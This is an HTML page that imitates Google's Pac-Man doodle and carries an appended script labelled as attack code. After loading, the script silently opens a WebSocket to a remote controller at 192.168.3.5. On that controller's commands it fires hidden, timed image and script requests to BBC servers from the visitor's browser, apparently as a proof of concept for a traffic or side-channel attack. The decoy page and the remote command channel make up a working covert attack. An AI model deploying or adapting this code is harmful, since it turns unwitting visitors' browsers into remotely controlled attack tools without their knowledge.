<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="icon" href="data:,">
    <link rel="dns-prefetch" href="http://static.bbci.co.uk">
    <script type="text/javascript">
    	window.google = {
      time: function () {
        return (new Date).getTime()
      },
      Toolbelt: {},
      y: {}
    }
    </script>
  </head>
  <body>
    <h1 id="evil"> Prepare To Get Wrecked </h1>
    <div id="pwn"></div>
    <span id="images"></span>
    <span id="text"></span>

    <center>
    <div id=lga>
      <div id=logo style="width:554px;height:186px;background:black url(pacman10-hp.png) 0 0 no-repeat;position:relative;margin-bottom:9px">
        <div id="logo-l" style="width:200px;height:2px;left:177px;top:157px;background:#990;position:absolute;display:none;overflow:hidden">
          <div id="logo-b" style="position:absolute;left:0;background:#ff0;height:8px;width:0"></div>
        </div>
      </div>

      <script>
        google.pml = function () {
          function d(a) {
            if (!google.pml_installed) {
              google.pml_installed = true;
              if (!a) {
                  document.getElementById("logo").style.background = "black";
                  window.setTimeout(function () {
                      var b = document.getElementById("logo-l");
                      if (b) b.style.display = "block"
                  }, 400)
              }
              a = document.createElement("script");
              a.type = "text/javascript";
              a.src = "pacman.js";
              google.dom.append(a)
            }
          }
          function e() {
            if (document.f && document.f.btnI) document.f.btnI.onclick = function () {
              if (typeof google.pacman != "undefined") google.pacman.insertCoin();
              else {
                google.pacManSound = true;
                d(false)
              }
              return false
            }
          }
          if (!google.pml_loaded) {
            google.pml_loaded = true;
            window.setTimeout(function () {
              d(true)
            }, 1E3);
            e();
            google.rein && google.rein.push(e);
            google.dstr && google.dstr.push(function () {
              google.pacman && google.pacman.destroy();
              if (google.pml_installed) {
                  google.pml_installed = false
              }
            });
            google.pacManQuery = function () {
              return false
            }
          }
        };
      </script>
    </div>
  </center>
  <script>
    google.dstr = [];
    google.rein = [];
    window.setTimeout(function () {
        var a = document.createElement("script");
        a.src = "google-script.js";
        document.body.appendChild(a);
    }, 0);
    google.neegg = 1;
    
    google.pml && google.pml();
  </script>
  
  </body>
<!--include js -->
<!-- the attack's code below-->
<script type="text/javascript">
// client
var initial =  0;
var counter = initial;
var timer;
var stage = 0;
var timeout = 80000;
var flag = false;
var sockets_num = 1;
function callback(id) {
	if (id >= initial && id <= initial + 9) {
		createImg(1, 1);
		return;
	} else if (id == initial + 10) {
		sendmsg();
		timer = setTimeout("createImg(1, 0)", timeout);
		return;
	}

	if (id > initial + 10) {
		if (flag) {
			flag = false;
			sendmsg();
		}
		timer = setTimeout("createImg(1, 0)", timeout);
	}
}
function onsuccess(id) {
	callback(id);
}

function ontimeout(id) {
	callback(id);
}

function createImg(n, type) {
	var images = document.getElementById("images");
	var childs = images.childNodes;
	for (var i = childs.length-1; i >= 0; i--) {
		images.removeChild(childs[i]);
	}
	var img = [];
	for (var i = 0; i < n; i++) {
		img.push(document.createElement("img"));
		//small picture
		if (type == 0)
      img[i].src = img[i].src = "http://static.bbci.co.uk/frameworks/barlesque/3.21.31/orb/4/img/orb-sprite.gif?id="+counter;
    else if (type == 1) //load large image to increase window size
      img[i].src = "http://static.bbci.co.uk/schoolradio/images/ic/qe//width/960/schoolradio/history/victorians/maids_tale/maid_960x540.jpg?id="+counter;

    img[i].id = counter;
		img[i].width = img[i].height = 0;
		img[i].setAttribute('onload',"onsuccess(this.id)");
		img[i].setAttribute('onerror',"ontimeout(this.id)");
		counter++;
	}
	for (i = 0; i < n; i++)
	    images.append(img[i]);
}

function createJs() {
	var js = document.createElement("script");
	js.src = "http://static.bbci.co.uk/frameworks/barlesque/3.22.55/orb/4/script/orb/api.min.js";
	js.type = "text/javascript";
	document.body.appendChild(js);
}

var url = "ws://192.168.3.5:30006";
var websocket;
var num = 0;
function open_websocket() {
	websocket = new WebSocket(url);	
	createImg(1, 1);
	websocket.onopen = function(event) {
		console.log("open");
	};
	websocket.onclose = function(event) {
		console.log("close");
	};
	websocket.onmessage = function(event) {
		if (event.data == 'up') {
			stage = 1;
			clearTimeout(timer);
			createImg(1, 1);
		} else if (event.data == 'xs') {
			clearTimeout(timer);
			createJs();
			sendmsg();
		} else if (event.data == 'do') {
			clearTimeout(timer);
			flag = true;
			createImg(1, 0);
		} else if (event.data == 'st') {
			clearTimeout(timer);
		}
	};
	websocket.onerror = function(event) {
		console.log("error");
	}
}
function sendmsg() {
	websocket.send("ok");
}
setTimeout("open_websocket()", 5000);

</script>
</html>